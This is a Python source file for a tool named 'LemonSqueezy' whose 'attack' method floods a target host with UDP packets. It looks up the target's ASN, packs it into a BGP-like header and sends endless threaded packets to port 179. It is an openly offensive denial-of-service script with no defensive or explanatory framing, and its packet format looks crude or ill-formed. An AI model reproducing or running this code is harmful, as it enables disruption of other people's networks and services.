import requests
import json
from socket import *
import threading
import time
import struct

class LemonSqueezy():
    def __init__(self, url, sleep_time, threading_count):
        self.ip = gethostbyname(url)
        print(self.ip)
        self.url = url
        self.sleep_time = sleep_time
        self.threading_count = threading_count

    def attack(self):
        packet_size = 1500
        num_packets = 1000
        threads = []
        s = socket(AF_INET, SOCK_DGRAM)

        def get_asn():
            r = requests.get(f"https://api.incolumitas.com/?q={self.ip}").json()
            return r["asn"]["asn"]

        target_as = get_asn()

        print("ASN: " + str(target_as))

        def begin():
            while True:
            # for i in range (20):
                packet = struct.pack("!BBH", 4, 2, target_as)
                s.sendto(packet, (self.url, 179))
                if self.sleep_time:
                    time.sleep(self.sleep_time)
                print(".", end="")

        for i in range(self.threading_count):
            thread = threading.Thread(target=begin)
            thread.start()
            threads.append(thread)

        for t in threads:
            t.join()